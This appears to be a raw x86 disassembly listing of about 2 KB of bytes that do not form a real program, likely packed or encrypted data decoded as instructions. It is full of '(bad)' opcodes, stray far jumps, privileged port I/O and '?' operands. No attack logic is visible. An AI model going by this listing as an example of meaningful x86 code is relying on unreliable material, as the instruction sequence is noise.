  402ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed9:	rcr    BYTE PTR [eax+0x7553c134],1
  402edf:	sbb    eax,0x8917f439
  402ee4:	lds    esp,FWORD PTR [esi]
  402ee6:	add    al,0x47
  402ee8:	cmp    ecx,ebx
  402eea:	mov    bh,0x8b
  402eec:	mov    al,BYTE PTR [edi]
  402eee:	mov    eax,ds:0x23cf8b4d
  402ef3:	adc    DWORD PTR [edx-0x6a988e18],esp
  402ef9:	mov    ah,bh
  402efb:	jbe    0x402eed
  402efd:	or     al,0xba
  402eff:	push   es
  402f00:	push   ss
  402f01:	ins    DWORD PTR es:[edi],dx
  402f02:	loope  0x402f41
  402f04:	aam    0x9
  402f06:	int3   
  402f07:	and    esi,esi
  402f09:	cmp    eax,0x655c66e3
  402f0e:	and    bl,BYTE PTR [ebx-0x4b]
  402f11:	adc    al,0x87
  402f13:	sbb    cl,dh
  402f15:	push   0xfffffffc
  402f17:	xchg   BYTE PTR [eax-0x13],ah
  402f1a:	sahf   
  402f1b:	test   BYTE PTR [esi+ebp*4+0x2d],cl
  402f1f:	jmp    0x3d0a:0x49caa9c2
  402f26:	stos   DWORD PTR es:[edi],eax
  402f27:	int3   
  402f28:	mov    edi,cs
  402f2a:	out    0x21,al
  402f2c:	sub    DWORD PTR [ebp+0x5a],edi
  402f2f:	out    dx,eax
  402f30:	jae    0x402f78
  402f32:	scas   eax,DWORD PTR es:[edi]
  402f33:	loop   0x402ee3
  402f35:	js     0x402f52
  402f37:	add    dh,BYTE PTR [ebx]
  402f39:	or     esp,eax
  402f3b:	imul   ebx,DWORD PTR [esi-0x3c720cdf],0xffffff9a
  402f42:	ror    al,1
  402f44:	sbb    ebp,eax
  402f46:	ret    
  402f47:	cmp    esi,ebx
  402f49:	mov    ebx,0x66817502
  402f4e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  402f50:	dec    edi
  402f51:	ss in  al,dx
  402f53:	xor    BYTE PTR [eax],bh
  402f55:	adc    ah,BYTE PTR es:[eax+ebp*4-0x5e8bef18]
  402f5d:	push   cs
  402f5e:	cmp    DWORD PTR [edx-0x2],ebp
  402f61:	and    esp,DWORD PTR [esi+0x4f9e01f4]
  402f67:	stc    
  402f68:	xchg   bl,cl
  402f6a:	arpl   WORD PTR [ebx],ax
  402f6c:	rol    DWORD PTR [edx-0x48],cl
  402f6f:	lahf   
  402f70:	int3   
  402f71:	adc    eax,0xf746659b
  402f76:	gs or  eax,0xb83f2ebf
  402f7c:	aaa    
  402f7d:	adc    eax,0xc661c8d5
  402f82:	call   0xaa319857
  402f87:	fist   DWORD PTR [esi+0x43]
  402f8a:	int3   
  402f8b:	inc    ecx
  402f8c:	mov    WORD PTR [edi+0x1b9e4a17],es
  402f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f93:	sbb    ebx,edx
  402f95:	cmp    al,bl
  402f97:	and    DWORD PTR [ecx+edx*1+0xd],edx
  402f9b:	enter  0x1645,0xae
  402f9f:	or     bl,cl
  402fa1:	jns    0x402fca
  402fa3:	leave  
  402fa4:	push   ecx
  402fa5:	adc    eax,0x62d2bbb4
  402faa:	popf   
  402fab:	sbb    esp,ecx
  402fad:	test   DWORD PTR [eax],ebx
  402faf:	fiadd  DWORD PTR [esi-0x3]
  402fb2:	cmp    eax,0xbd4506cc
  402fb7:	mov    ebp,0x42020899
  402fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fbe:	mov    ds:0x4acf1d20,al
  402fc3:	or     al,0x55
  402fc5:	call   0x73b9bdb0
  402fca:	retf   0xedde
  402fcd:	aas    
  402fce:	jno    0x402f70
  402fd0:	dec    eax
  402fd1:	jmp    0xc1de:0x21e8abd4
  402fd8:	dec    ebp
  402fd9:	mov    dl,0x98
  402fdb:	and    DWORD PTR [ebx],ecx
  402fdd:	xchg   ecx,eax
  402fde:	ds add eax,0x5a64e8ac
  402fe4:	adc    BYTE PTR [ebx+ebx*1-0x43],ah
  402fe8:	sbb    edi,esp
  402fea:	clc    
  402feb:	mov    fs:0xaaacb8ad,eax
  402ff1:	ds dec esp
  402ff3:	enter  0x5457,0xb9
  402ff7:	pop    ebx
  402ff8:	mov    edx,0x7061c286
  402ffd:	jno    0x402f8f
  402fff:	test   BYTE PTR [ebx],cl
  403001:	out    dx,eax
  403002:	mov    dh,0xbe
  403004:	mov    bh,0x36
  403006:	repz sbb edx,ebp
  403009:	mov    ss,WORD PTR [edx+0x444e59d0]
  40300f:	cdq    
  403010:	pop    ecx
  403011:	dec    edx
  403012:	ret    0xb0cc
  403015:	addr16 or cl,dh
  403018:	stos   BYTE PTR es:[edi],al
  403019:	add    BYTE PTR [edi],al
  40301b:	jb     0x402fea
  40301d:	lahf   
  40301e:	ins    DWORD PTR es:[edi],dx
  40301f:	sbb    ah,bl
  403021:	dec    esp
  403022:	and    DWORD PTR [ebp+0x5dea4678],0xffffffbc
  403029:	in     al,0x20
  40302b:	cbw    
  40302d:	xor    cl,cl
  40302f:	dec    edx
  403030:	and    BYTE PTR [eax-0x486e4767],bh
  403036:	sub    eax,0xebf2a318
  40303b:	out    dx,eax
  40303c:	inc    ecx
  40303d:	icebp  
  40303e:	neg    ebx
  403040:	add    DWORD PTR ds:0x9f951fa2,ebp
  403046:	test   eax,0x4db459f7
  40304b:	push   es
  40304c:	je     0x4030b7
  40304e:	add    DWORD PTR [eax-0x3872746],esp
  403054:	inc    edx
  403055:	hlt    
  403056:	jle    0x403010
  403058:	xchg   ebx,eax
  403059:	icebp  
  40305a:	mov    ecx,0x96436974
  40305f:	out    0x98,al
  403061:	loopne 0x403007
  403063:	fist   WORD PTR [eax+0x34b23dac]
  403069:	xchg   ebp,eax
  40306a:	pop    es
  40306b:	pop    ebp
  40306c:	pop    esi
  40306d:	daa    
  40306e:	adc    DWORD PTR [edx-0x3a799aac],esi
  403074:	cmc    
  403075:	xchg   ecx,eax
  403076:	mov    ecx,0x8250ddf9
  40307b:	les    ebp,FWORD PTR [esi+0x48a417b7]
  403081:	bound  ebx,QWORD PTR [edi]
  403083:	ds xor eax,0x1a7a03c3
  403089:	jmp    0x424c5db0
  40308e:	jp     0x4030b9
  403090:	mov    ebp,0xa40927aa
  403095:	inc    esp
  403096:	mov    eax,ds:0x63e15aa6
  40309b:	push   esi
  40309c:	or     eax,0x1eae66f7
  4030a1:	pop    edi
  4030a2:	in     al,0xf8
  4030a4:	jg     0x40308c
  4030a6:	cmp    esp,DWORD PTR [edx-0x41]
  4030a9:	pop    esi
  4030aa:	int    0xc2
  4030ac:	pushf  
  4030ad:	sub    al,0xf3
  4030af:	mul    DWORD PTR [eax-0x14]
  4030b2:	mov    DWORD PTR [ebx],edi
  4030b4:	aaa    
  4030b5:	cmp    dl,ah
  4030b7:	pop    edx
  4030b8:	pop    eax
  4030b9:	inc    eax
  4030ba:	clc    
  4030bb:	mov    bh,0x60
  4030bd:	and    eax,0xdc29a47c
  4030c2:	push   ebp
  4030c3:	lods   al,BYTE PTR ds:[esi]
  4030c4:	inc    esp
  4030c5:	cmp    eax,0xec4f3d4d
  4030ca:	xchg   esp,eax
  4030cb:	push   cs
  4030cc:	les    ebp,FWORD PTR [ecx-0x18]
  4030cf:	loop   0x4030c3
  4030d1:	mov    WORD PTR [edi-0x20],ds
  4030d4:	mov    dl,0x49
  4030d6:	jno    0x403075
  4030d8:	jnp    0x4030a8
  4030da:	dec    edx
  4030db:	push   edi
  4030dc:	test   eax,0x4b6ea074
  4030e1:	fdiv   DWORD PTR [edx+0x4f171090]
  4030e7:	jbe    0x403080
  4030e9:	mov    edx,0xb64039db
  4030ee:	xchg   edi,eax
  4030ef:	inc    edi
  4030f0:	xchg   edi,eax
  4030f1:	rcr    DWORD PTR [ebp-0x55881dd1],cl
  4030f7:	cmp    eax,0x1ee3785
  4030fc:	cld    
  4030fd:	fisttp QWORD PTR fs:[edx+0xb74499d]
  403104:	xlat   BYTE PTR ds:[ebx]
  403105:	test   DWORD PTR ds:0xc692b6d,0xf7921a04
  40310f:	or     BYTE PTR [ebp+0x1],ch
  403112:	mov    ds:0x70b74970,al
  403117:	rcr    BYTE PTR [eax],cl
  403119:	adc    ebx,eax
  40311b:	xchg   ecx,eax
  40311c:	mov    cl,0xd0
  40311e:	ins    DWORD PTR es:[edi],dx
  40311f:	sub    DWORD PTR [ebp-0x1c],ebx
  403122:	or     al,0x2f
  403124:	jb     0x4030c7
  403126:	mov    al,bl
  403128:	xor    DWORD PTR [eax-0x7fc4c2f8],ebp
  40312e:	inc    esp
  40312f:	inc    DWORD PTR [ecx+0x61]
  403132:	ss into 
  403134:	es stos DWORD PTR es:[edi],eax
  403136:	push   es
  403137:	inc    esp
  403138:	popf   
  403139:	in     eax,0xba
  40313b:	pop    esp
  40313c:	(bad)  
  40313d:	adc    al,0x90
  40313f:	out    0x5,eax
  403141:	mov    ds:0xcb1c7c51,al
  403146:	inc    ebx
  403147:	sbb    dh,BYTE PTR [eax+0x3f]
  40314a:	ins    DWORD PTR es:[edi],dx
  40314b:	jecxz  0x403182
  40314d:	and    edx,esi
  40314f:	arpl   dx,bp
  403151:	ja     0x4031cf
  403153:	mov    ds:0xf5672001,eax
  403158:	out    0xcb,al
  40315a:	and    eax,0xe0902e99
  40315f:	add    edi,0x644d218d
  403165:	adc    ecx,DWORD PTR [ebp+0x4]
  403168:	stos   BYTE PTR es:[edi],al
  403169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40316a:	aas    
  40316b:	push   ebx
  40316c:	lahf   
  40316d:	jl     0x4030ff
  40316f:	mov    ah,0x37
  403171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403172:	retf   
  403173:	test   al,0x6a
  403175:	pop    es
  403176:	xlat   BYTE PTR ds:[ebx]
  403177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403178:	mov    edx,0xadb854d6
  40317d:	fiadd  DWORD PTR [edx]
  40317f:	(bad)  
  403180:	and    eax,0x83bdf208
  403185:	jl     0x403181
  403187:	mov    cl,0xab
  403189:	ret    0x1346
  40318c:	jbe    0x4031e6
  40318e:	add    eax,0x17e60a95
  403193:	mov    eax,ds:0x65d56fb0
  403198:	ret    
  403199:	cld    
  40319a:	dec    ebx
  40319b:	pop    ss
  40319c:	inc    esp
  40319d:	std    
  40319e:	sti    
  40319f:	dec    edi
  4031a0:	push   ebx
  4031a1:	in     al,dx
  4031a2:	es clc 
  4031a4:	or     edi,ebp
  4031a6:	in     eax,0x72
  4031a8:	and    eax,0xca83a85a
  4031ad:	test   eax,0x3c66fb95
  4031b2:	jae    0x4031e5
  4031b4:	(bad)  
  4031b5:	daa    
  4031b6:	jbe    0x4031c7
  4031b8:	xor    bl,BYTE PTR [esi+0x31]
  4031bb:	ja     0x403161
  4031bd:	mov    edx,0xa85535c0
  4031c2:	in     al,dx
  4031c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c4:	or     eax,0xfa4f3ca8
  4031c9:	sbb    BYTE PTR [ecx+0x3c3911d1],cl
  4031cf:	mov    edi,0x437f97c3
  4031d4:	add    BYTE PTR [ecx-0x5288c723],ch
  4031da:	mov    ebp,?
  4031dc:	iret   
  4031dd:	fwait
  4031de:	test   BYTE PTR [edi+0xc],al
  4031e1:	pop    esp
  4031e2:	in     al,dx
  4031e3:	add    al,0x9b
  4031e5:	ss mov ch,0xc4
  4031e8:	and    DWORD PTR [eax+0x5f425a97],esp
  4031ee:	fs sbb al,0xcb
  4031f1:	ins    DWORD PTR es:[edi],dx
  4031f2:	popf   
  4031f3:	call   0xe7c3073d
  4031f8:	or     ecx,DWORD PTR [ebx]
  4031fa:	daa    
  4031fb:	imul   edx,eax,0xffffffbf
  4031fe:	xchg   esp,eax
  4031ff:	jmp    0xbc055cae
  403204:	(bad)  
  403206:	xchg   esi,eax
  403207:	pop    eax
  403208:	mov    al,ds:0x3016996a
  40320d:	cs lock pushf 
  403210:	rcl    bh,cl
  403212:	push   es
  403213:	sub    ebp,DWORD PTR [edi+0x27]
  403216:	cmp    eax,0x4873b3c4
  40321b:	xor    dl,BYTE PTR [esi+0x5]
  40321e:	mov    es,WORD PTR [esi-0x46f15bbc]
  403224:	retf   0x3ca2
  403227:	or     eax,0xa87bcc3c
  40322c:	mov    ecx,0x86490d8a
  403231:	xchg   esi,eax
  403232:	ins    DWORD PTR es:[edi],dx
  403233:	scas   al,BYTE PTR es:[edi]
  403234:	mov    ebp,0xbd892b4e
  403239:	adc    BYTE PTR [esi*2+0x649d019d],cl
  403240:	push   ecx
  403241:	sub    dl,ch
  403243:	xor    BYTE PTR [ebx+0x52d8f8a],0x8f
  40324a:	clc    
  40324b:	out    0xea,al
  40324d:	mov    esp,ecx
  40324f:	cmp    BYTE PTR [ecx-0x56],al
  403252:	mov    ebp,0x5d62f528
  403257:	(bad)  
  403258:	push   0x11
  40325a:	aad    0x89
  40325c:	mov    ds:0x7c2adacd,eax
  403261:	mov    ecx,0x6a747bd3
  403266:	fwait
  403267:	push   esi
  403269:	dec    eax
  40326a:	fimul  DWORD PTR [ecx]
  40326c:	and    DWORD PTR [ecx-0xf],0xcd03eada
  403273:	outs   dx,BYTE PTR ds:[esi]
  403274:	and    BYTE PTR [ebx],dh
  403276:	cld    
  403277:	or     bh,BYTE PTR [esi-0x21]
  40327a:	je     0x40323c
  40327c:	cmp    edi,DWORD PTR [edx]
  40327e:	mov    dl,0xe7
  403280:	dec    eax
  403281:	cld    
  403282:	in     eax,0x84
  403284:	std    
  403285:	cmp    edi,DWORD PTR [ebx+0x8bb8cf6]
  40328b:	inc    edi
  40328c:	lahf   
  40328d:	fmul   st(3),st
  40328f:	or     eax,0xde062db1
  403294:	aas    
  403295:	iret   
  403296:	lea    ecx,[edx-0x7e]
  403299:	push   eax
  40329a:	xchg   ebx,ecx
  40329c:	adc    DWORD PTR [ecx],edi
  40329e:	rcl    DWORD PTR ds:0x2a89a2e8,0xfb
  4032a5:	sbb    eax,0xaf811276
  4032aa:	(bad)  
  4032ab:	out    dx,eax
  4032ac:	(bad)  
  4032ad:	loopne 0x4032e7
  4032af:	popa   
  4032b0:	push   ss
  4032b1:	dec    edi
  4032b2:	push   ebp
  4032b3:	pop    eax
  4032b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b5:	sub    ebp,DWORD PTR [ecx]
  4032b7:	inc    esp
  4032b8:	jge    0x4032ae
  4032ba:	jmp    0x8680:0x3a5d89fa
  4032c1:	shr    DWORD PTR [esi+ebp*8+0x51],0x97
  4032c6:	cmp    DWORD PTR [esi+edi*8-0x2030c030],eax
  4032cd:	retf   
  4032ce:	stc    
  4032cf:	add    DWORD PTR [ebx+0xd],esi
  4032d2:	xchg   ecx,eax
  4032d3:	loope  0x40330f
  4032d5:	dec    eax
  4032d6:	and    eax,0x116a6cbd
  4032db:	sub    al,ch
  4032dd:	push   ebx
  4032de:	(bad)
  4032e2:	and    eax,0xc69aca2e
  4032e7:	mov    edi,0xc996fe22
  4032ec:	imul   ebx,DWORD PTR cs:[edx-0x7b],0xf248cd3b
  4032f4:	dec    ecx
  4032f5:	imul   esp,esi,0xffffffc5
  4032f8:	(bad)  
  4032f9:	xchg   edx,eax
  4032fa:	xor    ebp,DWORD PTR [esi+0x31]
  4032fd:	call   DWORD PTR [ebx+0x6e]
  403300:	push   ss
  403301:	dec    esp
  403302:	fwait
  403303:	sub    BYTE PTR [esi+ebx*1],al
  403306:	int3   
  403307:	ins    BYTE PTR es:[edi],dx
  403308:	mov    ?,WORD PTR [esi]
  40330a:	mov    ds:0x4863f89e,eax
  40330f:	cmp    BYTE PTR [edi],cl
  403311:	rcl    BYTE PTR [edx-0x7b],1
  403314:	mov    ch,0xe6
  403316:	jns    0x4032fa
  403318:	xchg   ecx,eax
  403319:	je     0x4032a8
  40331b:	inc    edx
  40331c:	mov    ch,0x92
  40331e:	cld    
  40331f:	dec    ebx
  403320:	dec    eax
  403321:	ins    BYTE PTR es:[edi],dx
  403322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403323:	dec    ebp
  403324:	loopne 0x40338b
  403326:	mov    esi,0x39d11b72
  40332b:	adc    cl,BYTE PTR [ebp-0x7dba4716]
  403331:	enter  0xfec7,0xa0
  403335:	gs imul edx,esp,0xdfe3cf54
  40333c:	fidiv  DWORD PTR [ecx]
  40333e:	repz xor al,0x9c
  403341:	sbb    BYTE PTR [ebx+ebp*8-0x39],ch
  403345:	enter  0x6fb0,0x60
  403349:	aaa    
  40334a:	adc    eax,0xe520d25d
  40334f:	cmp    cl,BYTE PTR [edi+0x3b]
  403352:	(bad)  
  403353:	fidivr WORD PTR [edi+0x3b48fdca]
  403359:	loopne 0x40335e
  40335b:	outs   dx,BYTE PTR ds:[esi]
  40335c:	push   ecx
  40335d:	add    edx,DWORD PTR [edx]
  40335f:	in     al,dx
  403360:	xchg   esi,eax
  403361:	xchg   edi,eax
  403362:	test   BYTE PTR [edx-0x4bf09f73],cl
  403368:	add    eax,0xd5a84933
  40336d:	mov    ds:0x2aaf5740,eax
  403372:	stc    
  403373:	inc    eax
  403374:	lods   eax,DWORD PTR ds:[esi]
  403375:	push   eax
  403376:	add    DWORD PTR [edi],0x3584dd57
  40337c:	inc    edi
  40337d:	rcr    DWORD PTR [esi+0x5b],cl
  403380:	test   al,0x5
  403382:	push   0x383454d5
  403387:	push   ds
  403388:	mov    edi,DWORD PTR [ecx+0x9d15ca8]
  40338e:	int3   
  40338f:	and    DWORD PTR [edx+0x7ed4590e],esi
  403395:	aaa    
  403396:	mov    ebx,0x26afba61
  40339b:	pusha  
  40339c:	mov    eax,0xdf6ee93c
  4033a1:	pop    edx
  4033a2:	leave  
  4033a3:	call   0x8b27153e
  4033a8:	pop    edi
  4033a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033aa:	out    0xfb,al
  4033ac:	jp     0x4033dd
  4033ae:	fbstp  TBYTE PTR [esi+0x34]
  4033b1:	ins    DWORD PTR es:[edi],dx
  4033b2:	or     ebx,ecx
  4033b4:	xor    DWORD PTR [eax-0x7e],ebp
  4033b7:	dec    eax
  4033b8:	pop    esp
  4033b9:	or     al,0xca
  4033bb:	mov    ah,0xd
  4033bd:	loopne 0x4033d4
  4033bf:	and    eax,0x9de99049
  4033c4:	mov    bl,BYTE PTR [eax+edx*8+0x27]
  4033c8:	pop    esi
  4033c9:	or     ebx,DWORD PTR [edi+ecx*2-0x5f]
  4033cd:	iret   
  4033ce:	cmp    al,0x53
  4033d0:	xchg   BYTE PTR [ebp+0x2dfc3b82],ch
  4033d6:	mov    edx,0x3f6e585f
  4033db:	fist   DWORD PTR [ecx]
  4033dd:	jmp    0x4033e5
  4033df:	inc    ebp
  4033e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033e1:	sub    al,BYTE PTR [ebp+0x4e]
  4033e4:	enter  0xdd66,0xe9
  4033e8:	loopne 0x4033cc
  4033ea:	(bad)  
  4033eb:	push   ds
  4033ec:	push   0xae653f87
  4033f1:	mov    esi,0x22dc0889
  4033f6:	nop
  4033f7:	aam    0xe
  4033f9:	repnz cmp ecx,esp
  4033fc:	dec    ebx
  4033fd:	or     DWORD PTR [ecx-0x26],eax
  403400:	xchg   esp,eax
  403401:	push   0x24f87c3d
  403406:	sub    al,0x37
  403408:	xor    ebp,DWORD PTR [esp+ebx*1-0x4e]
  40340c:	mov    eax,0x5fc447e6
  403411:	sub    eax,0x3d731665
  403416:	lock sbb dl,BYTE PTR [esi+0x2d5a2036]
  40341d:	pop    es
  40341e:	xor    DWORD PTR [ecx+edx*1+0xe],ebp
  403422:	repz or DWORD PTR [edx-0x66],eax
  403426:	arpl   WORD PTR [eax+0x63bc93e8],di
  40342c:	pop    ds
  40342d:	in     eax,0x3
  40342f:	or     BYTE PTR [edi-0x430d87ee],bh
  403435:	clc    
  403436:	neg    DWORD PTR [edx]
  403438:	push   esi
  403439:	jecxz  0x403456
  40343b:	fnsave [edx+0x76]
  40343e:	jecxz  0x403459
  403440:	or     al,0x82
  403442:	mov    ebx,0x303fe5e7
  403447:	mov    ebx,0x15886750
  40344c:	mov    ebx,0xf8c0cdbf
  403451:	push   ds
  403452:	aam    0xcf
  403454:	add    DWORD PTR [esi+0x7e],edx
  403457:	repnz add eax,0xd6bcdc0a
  40345d:	sbb    BYTE PTR [ebx+0x2c908cf6],dh
  403463:	test   dl,0x8a
  403466:	and    eax,0xcf1e3854
  40346b:	mov    ebp,0x10f3519f
  403470:	stos   BYTE PTR es:[edi],al
  403471:	test   al,0x8
  403473:	imul   ebx,DWORD PTR [ecx],0x40
  403476:	imul   DWORD PTR [ecx]
  403478:	pusha  
  403479:	pop    ecx
  40347a:	iret   
  40347b:	dec    ecx
  40347c:	(bad)  
  40347d:	fistp  QWORD PTR [esi-0x35]
  403480:	shr    DWORD PTR [ebx+0xd],0x83
  403484:	fisttp DWORD PTR [ebx-0x4f]
  403487:	loope  0x4034d7
  403489:	xchg   ecx,eax
  40348a:	imul   esp,DWORD PTR [esi-0x9],0xb
  40348e:	outs   dx,DWORD PTR ds:[esi]
  40348f:	or     ebx,DWORD PTR [edi]
  403491:	push   ds
  403492:	mov    ecx,DWORD PTR [esi]
  403494:	js     0x4034bc
  403496:	mov    ch,0x79
  403498:	and    eax,0x5dbcc48f
  40349d:	cmp    al,al
  40349f:	and    BYTE PTR [ebx],0x76
  4034a2:	lahf   
  4034a3:	xchg   edi,eax
  4034a4:	mov    ds:0x4a08f44c,al
  4034a9:	inc    ebp
  4034aa:	dec    edx
  4034ab:	daa    
  4034ac:	mov    bl,0x4b
  4034ae:	xor    bl,al
  4034b0:	(bad)  
  4034b1:	loope  0x4034f5
  4034b3:	add    edx,DWORD PTR [esi]
  4034b5:	gs jo  0x403472
  4034b8:	xor    BYTE PTR [eax+0x3b3abfba],bl
  4034be:	dec    esi
  4034bf:	sub    al,0xe3
  4034c1:	and    ah,BYTE PTR [esi-0x7a]
  4034c4:	sub    eax,0xea6b8469
  4034c9:	mov    dh,0xb6
  4034cb:	sub    eax,0xffffffa6
  4034ce:	shl    BYTE PTR [esi+0x1fc286f2],0x47
  4034d5:	mov    ch,0xb6
  4034d7:	cmp    BYTE PTR [eax+0x225309e7],dl
  4034dd:	lock inc edx
  4034df:	lahf   
  4034e0:	ret    
  4034e1:	and    DWORD PTR [edi-0x3],ebx
  4034e4:	loop   0x4034b1
  4034e6:	xchg   edi,eax
  4034e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034e8:	call   0x8b7c:0xa4658b09
  4034ef:	pop    es
  4034f0:	adc    eax,0x541b5156
  4034f5:	dec    esi
  4034f6:	sub    bh,BYTE PTR [ebx+0x26b86126]
  4034fc:	inc    esp
  4034fd:	and    eax,0x7a96f8d6
  403502:	jp     0x40351c
  403504:	push   edi
  403505:	and    al,0xc5
  403507:	adc    DWORD PTR [edx+0x47],0x90821fcb
  40350e:	jns    0x40353d
  403510:	out    dx,eax
  403511:	retf   
  403512:	mov    edx,DWORD PTR [ecx]
  403514:	mov    ch,0x76
  403516:	stc    
  403517:	rcr    DWORD PTR [edi-0x6b],1
  40351a:	jno    0x40352a
  40351c:	retf   
  40351d:	bound  ebx,QWORD PTR ds:0xc53cb2f6
  403523:	mov    al,ds:0x469466ad
  403528:	fcomp  st(3)
  40352a:	xchg   ebx,eax
  40352b:	aam    0xb5
  40352d:	push   esp
  40352e:	call   0x93803c83
  403533:	mov    bl,0x57
  403535:	jnp    0x40352c
  403537:	scas   eax,DWORD PTR es:[edi]
  403538:	cmp    BYTE PTR [edx+0xd],al
  40353b:	mov    bh,0xc
  40353d:	mov    ds:0xaf7cb67a,al
  403542:	xor    ch,BYTE PTR [ecx-0x6eab026]
  403548:	sti    
  403549:	cmp    dh,dh
  40354b:	mov    dh,0x36
  40354d:	sub    dh,bl
  40354f:	push   ds
  403550:	retf   0x71cb
  403553:	mov    ecx,0xbc6337fc
  403558:	repz or ecx,esi
  40355b:	inc    edx
  40355c:	jno    0x40359a
  40355e:	hlt    
  40355f:	bound  esp,QWORD PTR [edx+0x1ebcca0d]
  403565:	cld    
  403566:	dec    ebx
  403567:	cmp    DWORD PTR [ecx+edi*8+0x64b9035c],esp
  40356e:	adc    ah,al
  403570:	xchg   BYTE PTR [ebp+0xcd11059],al
  403576:	iret   
  403577:	xor    eax,0xed4e3655
  40357c:	xchg   DWORD PTR [edi-0x7752e2d9],edx
  403582:	xor    al,0xe9
  403584:	int    0x60
  403586:	or     al,bh
  403588:	(bad)  
  403589:	mov    es,WORD PTR [edi+esi*4+0x1aae101b]
  403590:	cdq    
  403591:	(bad)  
  403592:	push   ds
  403593:	or     DWORD PTR [esi-0x26353b0],ebx
  403599:	or     ebx,esp
  40359b:	ds inc esi
  40359d:	ins    BYTE PTR es:[edi],dx
  40359e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40359f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035a0:	adc    DWORD PTR [eax],eax
  4035a2:	divps  xmm7,xmm1
  4035a5:	push   ds
  4035a6:	rcr    BYTE PTR [eax+0x611f730a],0xbe
  4035ad:	gs jg  0x403615
  4035b0:	xchg   edx,eax
  4035b1:	cmp    BYTE PTR [esi+0x41],al
  4035b4:	xchg   esp,eax
  4035b5:	popf   
  4035b6:	fwait
  4035b7:	imul   edi,DWORD PTR [ecx-0x136e0213],0xe170f2f2
  4035c1:	cmp    DWORD PTR [eax+edi*2-0x4e],ebp
  4035c5:	(bad)
  4035c9:	add    al,0x1a
  4035cb:	mov    edx,0xd3158e03
  4035d0:	mov    BYTE PTR [edi-0x394a55c2],ch
  4035d6:	enter  0x6069,0x44
  4035da:	clc    
  4035db:	pop    edi
  4035dc:	aaa    
  4035dd:	test   eax,0x3fda962d
  4035e2:	gs lahf 
  4035e4:	loopne 0x40365e
  4035e6:	sbb    dl,BYTE PTR ds:[edi-0x534094b4]
  4035ed:	out    0x37,eax
  4035ef:	jecxz  0x403653
  4035f1:	test   DWORD PTR [edx-0x6d9dd856],edi
  4035f7:	jmp    0xbbec33eb
  4035fc:	xchg   edi,eax
  4035fd:	mov    bh,0x43
  4035ff:	hlt    
  403600:	arpl   WORD PTR [ecx],ax
  403602:	or     dh,BYTE PTR [edx+ebx*8-0x392c7d6b]
  403609:	cli    
  40360a:	bound  edi,QWORD PTR [di+0x28ab]
  40360f:	jb     0x40364f
  403611:	ins    BYTE PTR es:[edi],dx
  403612:	add    esp,ebp
  403614:	pop    edi
  403615:	inc    ebp
  403616:	pop    ds
  403617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403618:	fnstenv [esi-0x4f956150]
  40361e:	loop   0x4035fa
  403620:	push   edx
  403621:	add    bl,BYTE PTR [esi]
  403623:	dec    edx
  403624:	xor    al,0x91
  403626:	ret    0x2c5a
  403629:	mov    bl,0x7b
  40362b:	and    al,0x85
  40362d:	out    dx,eax
  40362e:	mov    ecx,edx
  403630:	call   0x709f:0x5e58805b
  403637:	enter  0xaee5,0xf
  40363b:	sahf   
  40363c:	cmp    BYTE PTR [esi],0x96
  40363f:	std    
  403640:	xor    edi,DWORD PTR [ebp-0x64]
  403643:	sbb    DWORD PTR [ecx],eax
  403645:	fs pushf 
  403647:	dec    ecx
  403648:	je     0x4035fb
  40364a:	std    
  40364b:	push   ecx
  40364c:	cwde   
  40364d:	mov    esi,0x39bd582b
  403652:	push   0xffffffce
  403654:	dec    eax
  403655:	cmp    eax,0x6326beb8
  40365a:	mov    edx,0x47342d6c
  40365f:	push   edx
  403660:	mov    bl,0x73
  403662:	dec    esp
  403663:	jno    0x4036c9
  403665:	jl     0x4036ae
  403667:	out    0x4a,eax
  403669:	cmp    BYTE PTR [esi+0x16c3a759],0x9f
  403670:	jl     0x40364e
  403672:	sub    eax,0x79b08c2
  403677:	mov    dh,0xd5
  403679:	inc    edi
  40367a:	adc    eax,0x250bef14
  40367f:	retf   
  403680:	jne    0x403642
  403682:	mov    gs,edi
  403684:	push   0x97545f9c
  403689:	mov    ah,0x13
  40368b:	retf   
  40368c:	xchg   esp,eax
  40368d:	pop    ss
  40368e:	js     0x403633
  403690:	(bad)  
  403691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403692:	push   es
  403693:	dec    esp
  403694:	ret    0x9ed3
  403697:	pop    edi
  403698:	outs   dx,BYTE PTR ds:[esi]
  403699:	(bad)  
  40369a:	fstp   DWORD PTR [ebx+0x757c7d03]
  4036a0:	push   esi
  4036a1:	mov    WORD PTR [ebx+0x1e39fa80],gs
  4036a7:	push   esp
  4036a8:	stos   BYTE PTR es:[edi],al
  4036a9:	pusha  
  4036aa:	ins    DWORD PTR es:[edi],dx
  4036ab:	test   DWORD PTR [esi],eax
  4036ad:	popf   
  4036ae:	dec    ebx
  4036af:	xlat   BYTE PTR ds:[ebx]
  4036b0:	jge    0x4036fc
  4036b2:	aaa    
  4036b3:	xchg   edx,eax
  4036b4:	pop    ss
  4036b5:	sbb    BYTE PTR [ecx+0x30],0xcb
  4036b9:	les    edx,FWORD PTR [eax+0xe85afc9]
  4036bf:	scas   eax,DWORD PTR es:[edi]
  4036c0:	in     al,dx
  4036c1:	dec    edi
  4036c2:	cmc    
  4036c3:	inc    edi
  4036c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036c5:	xchg   esi,eax
  4036c6:	pusha  
  4036c7:	jbe    0x403655
  4036c9:	out    dx,eax
  4036ca:	push   esi
  4036cb:	mov    WORD PTR [ecx-0x1262c809],ss
